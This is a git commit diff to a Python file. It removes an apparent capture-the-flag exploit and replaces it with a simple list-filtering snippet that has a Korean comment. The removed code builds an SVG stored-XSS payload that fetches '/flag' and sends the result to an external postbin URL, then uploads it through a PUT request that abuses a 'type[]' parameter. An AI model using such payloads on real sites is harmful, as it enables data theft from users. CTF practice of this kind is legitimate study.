5188158b3b27058fdfaea78e5aa739f4f6c0d949
skyepodium <skyepodium@gmail.com>
2023-05-03 01:32:10 +0900

    false injection

--- algorithm.py
+++ algorithm.py
@@ -1,26 +1,24 @@
-import requests
-
-base_url = "https://hallmark.web.actf.co"
-id = "ceea0b77-a47f-430f-a3be-d5202243bddd"
-
-payload = """<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
-   <script>
-   fetch("/flag")
-   .then(response => response.text())
-   .then(flag => fetch(`https://www.toptal.com/developers/postbin/1682775742995-4958162251859?flag=${flag}`))
-   </script>
-</svg>"""
-
-
-def update_svg() -> None:
-    data = {
-        "id": id,
-        "type[]": "image/svg+xml",
-        "content": payload
+fruits = [
+    {
+        'id': 1,
+        'name': 'banana',
+    },
+    {
+        'id': 2,
+        'name': 'apple',
+    },
+    {
+        'id': 3,
+        'name': 'orange',
     }
-    result = requests.put(f"{base_url}/card", data=data)
-    print(result.text)
+]
 
+selected_fruits = []
 
-if __name__ == "__main__":
-    update_svg()
+for fruit in fruits:
+    if (fruit['name'] == 'banana') == 0:
+        selected_fruits.append(fruit)
+
+print(selected_fruits)
+# name이 banana인 row 제외하고 조회
+# [{'id': 2, 'name': 'apple'}, {'id': 3, 'name': 'orange'}]
